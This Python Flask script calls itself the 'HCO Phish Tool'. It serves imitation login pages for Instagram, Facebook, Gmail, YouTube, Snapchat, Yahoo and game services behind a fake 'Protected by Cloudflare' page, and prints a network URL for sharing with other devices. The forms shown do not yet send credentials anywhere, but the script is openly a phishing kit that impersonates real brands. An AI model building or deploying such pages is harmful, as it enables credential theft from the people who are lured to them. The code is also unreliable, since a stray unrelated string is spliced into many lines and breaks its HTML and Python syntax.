#!/usr/bin/env python3
"""
HCO Phish Tool
For educational purposes only
"""

import os
import time
import sys
import subprocess
import threading
import webbrowser
from flask import Flask, render_template_string, redirect, request

# Check if Flask is installed, install if not
try:
    from flask import Flask, render_template_string, redirect, request
except ImportError:
    print("Installing Flask...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "flask"])
    from flask import Flask, render_template_string, redirect, request

# Color codes for terminal
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

app = Flask(__name__)

# Realistic login page templates
LOGIN_TEMPLATES = {
    "instagram": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            max-width: 350px;
            width: 100%;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
        }
        .logo {
            margin: 20px 0;
            font-size: 40px;
            font-weight: bold;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            margin: 10px 0;
        }
        .footer {
            margin-top: 20px;
            color: #8e8e8e;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">Instagram</div>
            <form>
                <input type="text" placeholder="Phone number, username, or email">
                <input type="password" placeholder="Password">
                <button>Log in</button>
            </form>
            <div class="footer">© 2024 Instagram from Meta</div>
        </div>
    </div>
</body>
</html>
    """,
    "facebook": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .header {
            background: #1877f2;
            color: white;
            padding: 10px 20px;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .logo {
            color: #1877f2;
            font-size: 40px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            margin: 10px 0;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #737373;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>facebook</h1>
    </div>
    <div class="container">
        <div class="logo">facebook</div>
        <form>
            <input type="text" placeholder="Email or phone number">
            <input type="password" placeholder="Password">
            <button>Log In</button>
        </form>
        <div class="footer">© 2024 Facebook</div>
    </div>
</body>
</html>
    """,
    "gmail": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
           极速快3
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo {
            color: #ea4335;
            font-size: 50px;
            font-weight: bold;
            margin-bottom: 30px;
        }
       极速快3
        .login-box {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
           极速快3
            font-size: 16px;
            font-weight: bold;
            margin: 20px 极速快3;
        }
        .footer {
            margin-top: 20px;
            color: #5f6368;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Gmail</div>
        <div class="login-box">
            <h2>Sign in</h2>
            <p>Use your Google Account</p>
            <form>
                <input type="email" placeholder="Email or phone">
                <button>Next</极速快3ton>
            </form>
        </div>
        <div class="footer">© 2024 Google</div>
    </div>
</body>
</html>
    """
}

# Platform data
PLATFORMS = {
    "1": {"name": "Instagram", "path": "/instagram"},
    "2": {"name": "Facebook", "path": "/facebook"}, 
    "3": {"name": "Gmail", "path": "/gmail"},
    "4": {"name": "YouTube", "path": "/youtube"},
    "5": {"name": "Free Fire", "path": "/freefire"},
    "6": {"name": "PUBG", "path": "/pubg"},
    "7": {"name": "BGMI", "path": "/bgmi"},
    "8": {"name": "Threads", "极速快3path": "/threads"},
    "9": {"name": "Snapchat", "path": "/snapchat"},
    "10": {"name": "Yahoo", "path": "/yahoo"}
}

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Cloudflare Protected</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f6ff;
            text-align: center;
            padding: 50px;
            margin: 0;
        }
        .cloudflare-logo {
            font-size: 48px;
            color: #f38020;
            margin-bottom: 20px;
        }
        .protected {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 100px auto;
        }
        h2 {
            color: #f38020;
            margin-bottom: 15px;
        }
        p {
            color: #666;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="protected">
        <div class="cloudflare-logo">☁️</div>
        <h2>Protected by Cloudflare</h2>
        <p>This content is secured by Cloudflare security services</p>
        <p>Please use specific platform links:</p>
        <p><a href="/instagram">Instagram</a> | <a href="/facebook">Facebook</a> | <a href="/gmail">Gmail</a></p>
    </div>
</body>
</html>
    """)

@app.route('/instagram')
def instagram():
    return render_template_string(LOGIN_TEMPLATES["instagram"])

@app.route('/facebook')
def facebook():
    return render_template_string(LOGIN_TEMPLATES["facebook"])

@app.route('/gmail')
def gmail():
    return render_template_string(LOGIN_TEMPLATES["gmail"])

@app.route('/youtube')
def youtube():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: white;
            margin: 0;
            padding: 0;
        }
        .header {
            background: #ff0000;
            color: white;
            padding: 15px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }
        .login-container {
            max-width: 400px;
            margin: 100px auto;
            padding: 30px;
            border: 1px solid #ddd;
            border-radius: 8px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #ff0000;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="header">YouTube</div>
    <div极速快3 class="login-container">
        <h2>Sign in</h2>
        <input type="email" placeholder="Email">
        <input type="password" placeholder="Password">
        <button>Sign in</button>
    </div>
</body>
</html>
    """)

# Add similar routes for other platforms
@app.route('/freefire')
def freefire():
    return render_template_string(create_login_page("Free Fire", "#ff6600"))

@app.route('/pubg')
def pubg():
    return render_template_string(create_login_page("PUBG Mobile", "#ffcc00"))

@app.route('/bgmi')
def bgmi():
    return render_template_string(create_login_page("BGMI", "#3366ff"))

@app.route('/threads')
def threads():
    return render_template_string(create_login_page("Threads", "#000000"))

@app.route('/snapchat')
def snapchat():
    return render_template_string(create_login_page("Snapchat", "#fffc00"))

@app.route('/yahoo')
def yahoo():
    return render_template_string(create_login_page("Yahoo", "#720e9e"))

def create_login_page(name, color):
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>{name}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }}
        .login-box {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            width: 350px;
            text-align: center;
        }}
        .logo {{
            color: {color};
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 20px;
        }}
        input {{
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }}
        button {{
            width: 100%;
            padding: 12px;
            background: {color};
            color: white;
            border: none;
            border-radius: 5px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">{name}</div>
        <input type="text" placeholder="Username or Email">
        <input type="password" placeholder="Password">
        <button>Login</button>
    </div>
</body>
</html>
    """

def print_banner():
    os.system('clear')
    print(f"{colors.RED}{colors.BOLD}")
    print("╔══════════════════════════════════════════════════╗")
    print("║                HCO Phish Tool                   ║")
    print("║                 by Azhar                        ║")
极速快3    print("╚══════════════════════════════════════════════════╝")
    print(f"{colors.END}")
    print(f"{colors.RED}Tool locked 🔐 To unlock subscribe our YouTube channel{colors.END}")
    print()

def open_youtube():
    """Open YouTube using Termux API or direct intent"""
    try:
        # Try using Termux API to open YouTube app
        result = subprocess.run(['termux-open-url', 'https://www.youtube.com'], 
                              capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            return True
    except:
        pass
    
    try:
        # Try using am (Android activity manager)
        result = subprocess.run(['am', 'start', '-a', 'android.intent.action.VIEW', 
                               '-极速快3d', 'https://www.youtube.com'], 
                              capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            return True
    except:
        pass
    
    try:
        # Try using webbrowser as fallback
        webbrowser.open('https://www.youtube.com')
        return True
    except:
        pass
    
    return False

def countdown():
    print(f"{colors.RED}Redirecting to YouTube in:{colors.END}")
    for i in range(5, 0, -1):
        print(f"{colors.YELLOW}{i}{colors.END}")
        time.sleep(1)
        if i > 1:
            # Move cursor up one line and clear line
            sys.stdout.write("\033[F\033[K")
    
    print(f"{colors.GREEN}Opening YouTube...{colors.END}")
    
    # Try to open YouTube
    if open_youtube():
        print(f"{colors.GREEN}YouTube should open shortly...{colors.END}")
    else:
        print(f"{colors.RED}Could not open YouTube automatically.{colors.END}")
        print(f"{colors.YELLOW}Please manually open: https://www.youtube.com{colors.END}")
    
    time.sleep(3)
    
    print(f"{colors.CYAN}Welcome back! Tool unlocked.{colors.END}")
    time.sleep(1)
    
    # Show options
    print(f"\n{colors.RED}HCO Phish by Azhar{colors.END}")
    print(f"{colors.YELLOW}Available options:{colors.END}")
    for key, value in PLATFORMS.items():
        print(f"{colors.GREEN}{key}. {value['name']}{colors.END}")
    
    print(f"\n{colors.CYAN}Select an option (1-10): {colors.END}", end='')
    choice = input().strip()
    
    if choice in PLATFORMS:
        platform = PLATFORMS[choice]
        ip = get_ip()
        print(f"\n{colors.BLUE}Selected: {platform['name']}{colors极速快3.END}")
        print(f"{colors.YELLOW}URL: http://{ip}:5000{platform['path']}{colors.END}")
        print(f"{colors.GREEN}Open this URL on another device (phone/computer){colors.END}")
        print(f"{colors.WHITE}Press Enter to continue...{colors.END}")
        input()
    else:
        print(f"{colors.RED}Invalid option!{colors.END}")

def get_ip():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def run_flask():
    ip = get_ip()
    print(f"{colors.BLUE}\nWeb server starting on http://{ip}:5000{colors.END}")
    print(f"{colors.CYAN}Realistic login pages are ready for all platforms{colors.END}")
    print(f"{colors.GREEN}Share this URL with other devices: http://{ip}:5000{colors.END}")
    
    # Disable Flask development server warning
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    
    # Run Flask without all the verbose output
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    
    # Run Flask quietly
    import warnings
    warnings.filterwarnings("ignore")
    
    # Run the server
    from werkzeug.serving import make_server
    server = make_server('0.0.0.0', 5000, app, threaded=True)
    print(f"{colors.GREEN}Server started successfully!{colors.END}")
    print(f"{colors.YELLOW}Press Ctrl+C to stop the server{colors.END}")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{colors.RED}Server stopped.{colors.END}")

def main():
    print_banner()
    
    # Wait for user to press enter
    input(f"{colors.YELLOW}Press Enter after subscribing...{colors.END}")
    
    # Start countdown
    countdown()
    
    # Start Flask app
    run_flask()

if __name__ == '__main__':
    main()
